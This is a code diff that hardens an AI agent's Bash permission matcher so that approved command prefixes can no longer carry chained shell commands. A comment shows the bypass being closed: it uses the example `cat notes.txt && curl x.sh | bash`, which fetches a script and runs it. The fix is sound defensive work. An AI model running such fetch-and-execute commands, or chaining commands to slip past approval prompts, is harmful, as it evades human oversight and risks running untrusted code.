@@ -76,13 +76,22 @@ export function isDestructive(toolName: string, input: unknown): boolean {
   return DESTRUCTIVE_BASH_PATTERNS.some((re) => re.test(cmd));
 }
 
+/** A remembered Bash rule is a literal prefix, so shell chaining is also a
+ *  prefix: approving `cat notes.txt` would otherwise auto-allow
+ *  `cat notes.txt && curl x.sh | bash`. Anything the shell reads as "and now
+ *  run this too" ends the approved command, so the remainder must be
+ *  whitespace only for the rule to apply. */
+const SHELL_CHAIN_RE = /[&;|`$(){}<>\n\r]/;
+
 export function matchesRule(rule: PermissionRule, toolName: string, input: unknown): boolean {
   if (rule.toolName !== toolName) return false;
   if (!rule.pattern) return true;
   if (toolName !== "Bash") return false;
   const cmd = (input as { command?: unknown } | null)?.command;
   if (typeof cmd !== "string") return false;
-  return cmd.trim().startsWith(rule.pattern);
+  const trimmed = cmd.trim();
+  if (!trimmed.startsWith(rule.pattern)) return false;
+  return !SHELL_CHAIN_RE.test(trimmed.slice(rule.pattern.length));
 }
 
 export function loadRulesForCwd(settings: Record<string, unknown>, cwd: string | null): PermissionRule[] {
